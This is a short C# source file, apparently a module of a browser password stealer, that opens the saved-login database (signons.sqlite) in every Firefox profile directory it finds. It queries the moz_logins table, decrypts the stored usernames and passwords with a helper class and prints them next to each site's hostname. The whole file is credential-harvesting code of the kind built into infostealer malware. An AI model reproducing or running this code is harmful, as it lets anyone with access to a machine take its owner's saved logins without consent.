using System.Data;
using System.Data.SQLite;
using System.IO;

namespace MozillaDecrypt
{
    public class GetPassword 
    {
        public static void _OldFireFox()
        {
            foreach (var dir in Directory.GetDirectories(PathFireFox.GetRandomFF()))
            {
                using (var Connect = new SQLiteConnection($"Data Source={Path.Combine(dir, "signons.sqlite")};Version=3;New=False;Compress=True;"))
                {
                    using (var ComText = new SQLiteCommand("SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins", Connect))
                    {
                        Connect.Open();
                        ComText.CommandType = CommandType.Text;
                        using (var reader = ComText.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                string Link = reader.GetString(2);
                                string UserName = DecMozilla.Decrypt(reader.GetString(0));
                                string Password = DecMozilla.Decrypt(reader.GetString(1));

                                System.Console.WriteLine(Link);
                                System.Console.WriteLine(UserName);
                                System.Console.WriteLine(Password);
                            }
                        }
                    }
                }
            }
        }
    }
}